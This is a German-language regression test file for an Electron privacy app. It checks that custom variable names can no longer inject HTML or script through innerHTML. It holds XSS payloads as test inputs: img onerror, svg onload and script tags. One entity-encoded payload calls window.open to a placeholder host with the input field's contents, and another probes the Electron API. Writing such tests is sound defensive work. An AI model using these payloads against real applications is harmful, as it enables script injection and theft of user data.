// S3.fix (rot bis zur Umsetzung): Eigene Variablen duerfen nie als HTML in die Oberflaeche gelangen (S3 der GPT-Pruefung 1).
// Ursache: addCV() uebernimmt den Namen nur mit trim/Grossschreibung/Unterstrich, renderCV() setzt ihn unmaskiert in innerHTML.
// Erwartung nach der Umsetzung (Ablehnen ODER Neutralisieren, beides erfuellt die Tests):
//  - kein Element, kein Ereignishandler, kein Ausloeser fuer window.open aus dem Namen
//  - jeder gespeicherte Name genuegt der strengen Regel der Bestandsfunktionen (policy.CATEGORY_RE, marks PFX_RE): ^[A-Z][A-Z0-9_]{1,19}$
//  - renderCV baut die Zeilen ohne innerHTML (textContent/createElement)
// Nur harmlose Ereignismarker (window.PSS3*), externes Oeffnen wird vom Testmodus (PS_BLOCK_EXTERNAL=1) nur protokolliert. Synthetische Werte.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { launchApp, toolFrame, ROOT } from './helpers.mjs';

const require = createRequire(import.meta.url);
const placeholder = require('../app/lib/placeholder.js');
const STRIKT = /^[A-Z][A-Z0-9_]{1,19}$/;
// alle Zeichen als HTML-Entitaet: Gross-/Kleinschreibung und Leerraum spielen keine Rolle
const ent = (s) => [...s].map((c) => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');

async function mitApp(fn) {
  const a = await launchApp({ offline: true });
  try {
    const f = await toolFrame(a.win);
    await f.evaluate(() => { try { localStorage.setItem('privacyShield_onboarding_done', 'true'); } catch (e) {} });
    return await fn(a, f);
  } finally { await a.close(); }
}
async function addVar(f, name, pat = 'ZZQ\\d{3}') {
  await f.evaluate(({ name, pat }) => {
    document.getElementById('VN').value = name;
    document.getElementById('VP').value = pat;
    addCV();
  }, { name, pat });
  await f.waitForTimeout(500);
}
const namen = (f) => f.evaluate(() => cvars.map((v) => v.n));
// Alles, was in #CVL ausser den drei erwarteten Elementarten steht (div-Zeile, span, button)
const fremdeElemente = (f) => f.evaluate(() => [...document.querySelectorAll('#CVL *')]
  .filter((e) => !['DIV', 'SPAN', 'BUTTON'].includes(e.tagName)).map((e) => e.tagName));

test('Markup-Name <b>test</b>: kein <b>-Element in der Variablenliste, nur woertlicher Text oder abgelehnt', () => mitApp(async (a, f) => {
  await addVar(f, '<b>test</b>');
  assert.deepEqual(await fremdeElemente(f), [], 'in #CVL darf kein eingeschleustes Element stehen');
  assert.equal(await f.evaluate(() => document.querySelectorAll('#CVL b').length), 0);
}));

test('Markup-Name <b>test</b>: der gespeicherte Name erfuellt die strenge Kategorienregel (oder die Variable wurde abgelehnt)', () => mitApp(async (a, f) => {
  await addVar(f, '<b>test</b>');
  for (const n of await namen(f)) assert.match(n, STRIKT, 'Name ' + JSON.stringify(n) + ' verletzt ^[A-Z][A-Z0-9_]{1,19}$');
}));

test('Ereignishandler im Namen (<img onerror=...>) wird nicht ausgefuehrt und erzeugt kein img-Element', () => mitApp(async (a, f) => {
  await addVar(f, '<IMG/SRC="X"/ONERROR=PSS3MARK=1>');
  await f.waitForTimeout(500);
  const r = await f.evaluate(() => ({ mark: window.PSS3MARK === 1, imgs: document.querySelectorAll('#CVL img').length }));
  assert.equal(r.mark, false, 'Ereignismarker wurde gesetzt: Skript aus dem Namen lief');
  assert.equal(r.imgs, 0);
}));

test('Ereignishandler mit Entitaeten (Gross-/Kleinschreibung egal) erreicht weder parent.electronAPI noch window.open', () => mitApp(async (a, f) => {
  await f.evaluate(() => { document.getElementById('IT').value = 'SYNTHETISCH-TESTWERT-123'; });
  const js1 = "window.open('https://example.invalid/ps-s3?d='+encodeURIComponent(document.getElementById('IT').value))";
  const js2 = "window.PSS3API=typeof parent.electronAPI+':'+typeof parent.electronAPI.copyText";
  await addVar(f, '<IMG/SRC="X"/ONERROR=' + ent(js1) + '>');
  await addVar(f, '<IMG/SRC="X"/ONERROR=' + ent(js2) + '>');
  await f.waitForTimeout(800);
  const ext = await a.app.evaluate(() => globalThis.__psExternal);
  assert.deepEqual(ext, [], 'es darf kein externer Aufruf mit Dokumentdaten entstehen');
  assert.equal(await f.evaluate(() => window.PSS3API || null), null, 'Skript aus dem Namen sieht electronAPI');
}));

test('Markup-Name bringt kein neues Element ausserhalb der Variablenliste in die Seite (script, iframe, svg, style, a, form)', () => mitApp(async (a, f) => {
  const zaehle = () => f.evaluate(() => document.querySelectorAll('script, iframe, svg, style, a, form, img, object, embed').length);
  const vorher = await zaehle();
  await addVar(f, '<svg onload=PSS3SVG=1></svg><script>PSS3SCR=1</script><a href=x>l</a>');
  const r = await f.evaluate(() => ({ svg: window.PSS3SVG === 1, scr: window.PSS3SCR === 1 }));
  assert.deepEqual(r, { svg: false, scr: false });
  assert.equal(await zaehle(), vorher, 'die Zahl der Elemente darf durch einen Namen nicht wachsen');
}));

// Jedes Markup-Zeichen einzeln: abgelehnt oder neutralisiert, nie unveraendert gespeichert
for (const [zeichen, bezeichnung] of [['<', 'spitze Klammer auf'], ['>', 'spitze Klammer zu'], ['&', 'Und-Zeichen'], ['"', 'doppeltes Anfuehrungszeichen'], ["'", 'einfaches Anfuehrungszeichen']]) {
  test(`Name mit ${bezeichnung} (${zeichen}) wird abgelehnt oder neutralisiert und nie unveraendert gespeichert`, () => mitApp(async (a, f) => {
    await addVar(f, 'KUNDE' + zeichen + 'NR');
    const ns = await namen(f);
    for (const n of ns) {
      assert.ok(!n.includes(zeichen), 'Zeichen ' + zeichen + ' steckt im gespeicherten Namen ' + JSON.stringify(n));
      assert.match(n, STRIKT);
    }
    assert.ok(!(await f.evaluate(() => document.getElementById('CVL').innerHTML)).includes('KUNDE' + zeichen + 'NR'), 'Rohname steht im HTML der Liste');
  }));
}

test('Name mit fuehrender Ziffer oder zu lang wird abgelehnt oder auf die strenge Regel gebracht (wie Regeln und Markierungen)', () => mitApp(async (a, f) => {
  await addVar(f, '1ABC');
  await addVar(f, 'EIN_SEHR_LANGER_VARIABLENNAME_UEBER_ZWANZIG');
  await addVar(f, 'X');
  for (const n of await namen(f)) assert.match(n, STRIKT, 'Name ' + JSON.stringify(n) + ' verletzt ^[A-Z][A-Z0-9_]{1,19}$');
}));

test('Rundlauf: Platzhalter aus einem Markup-Namen ist immer ein gueltiger Platzhalter (Gegenpruefung und Rueckuebersetzung erkennen ihn)', () => mitApp(async (a, f) => {
  await addVar(f, '<B>TEST</B>');
  const out = await f.evaluate(async () => {
    document.getElementById('IT').value = 'Kontakt ZZQ123 Ende';
    aiCache = { key: null, spans: [] };
    await anon();
    return document.getElementById('AT').value;
  });
  assert.ok(!out.includes('<B>') && !out.includes('</B>'), 'Markup steht im Ergebnis: ' + out);
  for (const m of out.match(/\{\{[^}]*\}\}/g) || []) assert.ok(placeholder.isToken(m), 'kein gueltiger Platzhalter: ' + m);
}));

test('renderCV setzt den Namen ohne innerHTML ein (textContent/createElement)', () => {
  const html = fs.readFileSync(path.join(ROOT, 'app', 'privacy-shield.html'), 'utf8');
  const start = html.indexOf('function renderCV()');
  assert.ok(start >= 0, 'renderCV nicht gefunden');
  const ende = html.indexOf('\n      }\n', start);
  const body = html.slice(start, ende);
  assert.ok(!/innerHTML/.test(body), 'renderCV verwendet innerHTML:\n' + body);
});

test('Kontrolle (bleibt gruen): gueltiger Name mit Leerraum wird gross geschrieben, als Text gezeigt und im Ergebnis ersetzt', () => mitApp(async (a, f) => {
  await addVar(f, 'kunde nr');
  assert.deepEqual(await namen(f), ['KUNDE_NR']);
  assert.equal(await f.evaluate(() => document.querySelector('#CVL .custom-var-name').textContent), '{{KUNDE_NR}}');
  const out = await f.evaluate(async () => {
    document.getElementById('IT').value = 'Kontakt ZZQ123 Ende';
    aiCache = { key: null, spans: [] };
    await anon();
    return document.getElementById('AT').value;
  });
  assert.match(out, /\{\{KUNDE_NR_1\}\}/);
  assert.ok(!out.includes('ZZQ123'));
}));
